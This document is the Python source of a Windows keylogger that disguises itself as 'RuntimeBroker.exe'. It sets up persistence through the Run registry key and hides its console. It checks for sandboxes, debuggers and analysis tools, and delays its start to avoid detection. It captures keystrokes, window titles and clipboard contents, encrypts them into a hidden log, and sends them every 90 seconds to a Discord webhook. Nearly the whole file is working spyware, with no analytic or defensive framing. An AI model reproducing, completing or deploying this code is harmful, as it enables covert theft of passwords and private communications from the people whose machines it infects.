# rb.py   →   build as RuntimeBroker.exe
import base64, ctypes, ctypes.wintypes as wt, hashlib, os, random, socket
import sys, threading, time, urllib.request, uuid, winreg

u32 = ctypes.WinDLL("user32", use_last_error=True)
k32 = ctypes.WinDLL("kernel32", use_last_error=True)

WEBHOOK = "https://discord.com/api/webhooks/XXXX/YYYY"

APPDIR  = os.path.join(os.environ["APPDATA"], "Microsoft", "CLR")
LOGPATH = os.path.join(APPDIR, "clr.dat")
MUTEX   = "RB01_8F1A2C44"
KEY     = hashlib.sha256((str(uuid.getnode()) + "s4lt").encode()).digest()

# ---------- sealed storage ----------
def seal(data: bytes) -> str:
    return base64.b64encode(bytes(b ^ KEY[i % 32] for i, b in enumerate(data))).decode()

def unseal(s: str) -> bytes:
    x = base64.b64decode(s)
    return bytes(b ^ KEY[i % 32] for i, b in enumerate(x))

# ---------- single instance ----------
def already_running() -> bool:
    k32.CreateMutexW(None, False, MUTEX)
    return k32.GetLastError() == 183  # ERROR_ALREADY_EXISTS

# ---------- environment checks ----------
class MEMSTAT(ctypes.Structure):
    _fields_ = [("dwLength", wt.DWORD), ("dwMemoryLoad", wt.DWORD),
                ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]

def looks_like_sandbox() -> bool:
    if k32.GetActiveProcessorCount(-1) < 2:
        return True
    ms = MEMSTAT(); ms.dwLength = ctypes.sizeof(ms)
    k32.GlobalMemoryStatusEx(ctypes.byref(ms))
    if ms.ullTotalPhys < 3 * 1024**3:
        return True
    if k32.GetTickCount64() < 12 * 60 * 1000:
        return True
    if u32.GetCursorPos(ctypes.byref(wt.POINT())):
        pass
    if k32.IsDebuggerPresent():
        return True
    try:
        out = subprocess.run(["tasklist"], capture_output=True, text=True,
                             creationflags=0x08000000).stdout.lower()
        for bad in ("procmon", "wireshark", "x64dbg", "ollydbg", "ida64", "vboxservice", "vmware"):
            if bad in out:
                return True
    except Exception:
        pass
    return False

# ---------- install + persist ----------
def install():
    os.makedirs(APPDIR, exist_ok=True)
    if getattr(sys, "frozen", False):
        dst = os.path.join(APPDIR, "RuntimeBroker.exe")
        if os.path.abspath(sys.executable) != os.path.abspath(dst):
            try:
                with open(sys.executable, "rb") as s, open(dst, "wb") as d:
                    d.write(s.read())
                subprocess.Popen([dst], creationflags=0x08000000)
                sys.exit(0)
            except Exception:
                pass
        cmd = f'"{dst}"'
    else:
        dst = os.path.join(APPDIR, "rb.pyw")
        with open(os.path.abspath(sys.argv[0]), "rb") as s, open(dst, "wb") as d:
            d.write(s.read())
        cmd = f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{dst}"'
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "RuntimeBroker", 0, winreg.REG_SZ, cmd)
    except Exception:
        pass

# ---------- capture ----------
SPECIAL = {0x08:"[BS]", 0x09:"[TAB]", 0x0D:"[ENTER]", 0x1B:"[ESC]",
           0x25:"[LEFT]", 0x26:"[UP]", 0x27:"[RIGHT]", 0x28:"[DOWN]",
           0x2E:"[DEL]", 0x24:"[HOME]", 0x23:"[END]", 0x21:"[PGUP]",
           0x22:"[PGDN]", 0x14:"[CAPS]", 0x5B:"[WIN]", 0x2C:"[PRTSC]"}

_buf, _lock, _last_win, _last_clip = [], threading.Lock(), "", ""

def flush():
    with _lock:
        if not _buf: return
        chunk = "".join(_buf); _buf.clear()
    with open(LOGPATH, "a", encoding="utf-8") as f:
        f.write(seal(chunk.encode()) + "\n")

def foreground() -> str:
    h = u32.GetForegroundWindow()
    b = ctypes.create_unicode_buffer(256)
    u32.GetWindowTextW(h, b, 256)
    return b.value

def clipboard() -> str:
    if not u32.OpenClipboard(None): return ""
    try:
        h = u32.GetClipboardData(13)  # CF_UNICODETEXT
        if not h: return ""
        return ctypes.wstring_at(k32.GlobalLock(h))
    finally:
        k32.GlobalUnlock(h); u32.CloseClipboard()

def char_for(vk: int) -> str:
    scan = u32.MapVirtualKeyW(vk, 0)
    state = (ctypes.c_ubyte * 256)()
    u32.GetKeyboardState(state)
    buf = ctypes.create_unicode_buffer(8)
    n = u32.ToUnicodeEx(vk, scan, state, buf, 8, 0, u32.GetKeyboardLayout(0))
    return buf.value if n > 0 else ""

def capture():
    global _last_win, _last_clip
    down = set()
    tick = 0
    while True:
        title = foreground()
        if title and title != _last_win:
            _last_win = title
            _buf.append(f"\n\n[{title}]\n")

        for vk in range(8, 255):
            if u32.GetAsyncKeyState(vk) & 0x8000:
                if vk in down: continue
                down.add(vk)
                if vk in SPECIAL: _buf.append(SPECIAL[vk])
                else:
                    c = char_for(vk)
                    if c: _buf.append(c)
            else:
                down.discard(vk)

        tick += 1
        if tick % 200 == 0:
            c = clipboard()
            if c and c != _last_clip:
                _last_clip = c
                _buf.append(f"\n[CLIP] {c}\n")
            flush()
        if len(_buf) > 400: flush()
        time.sleep(0.02)

# ---------- exfil ----------
def exfil():
    sent = 0
    while True:
        time.sleep(90)
        try:
            if not os.path.exists(LOGPATH): continue
            with open(LOGPATH, "r", encoding="utf-8") as f:
                lines = f.readlines()
            new = lines[sent:]
            if not new: continue
            body = "".join(unseal(l.strip()).decode(errors="replace") for l in new)
            req = urllib.request.Request(
                WEBHOOK, data=body[:1900].encode(), method="POST",
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                         "Content-Type": "text/plain"})
            urllib.request.urlopen(req, timeout=15)
            sent = len(lines)
        except Exception:
            pass

# ---------- main ----------
def main():
    if already_running(): return
    hwnd = k32.GetConsoleWindow()
    if hwnd: u32.ShowWindow(hwnd, 0); k32.FreeConsole()

    if looks_like_sandbox():
        time.sleep(random.randint(700, 1100))
    install()
    flush()
    threading.Thread(target=exfil, daemon=True).start()
    time.sleep(random.randint(500, 900))   # stall past detonation window
    capture()

if __name__ == "__main__":
    main()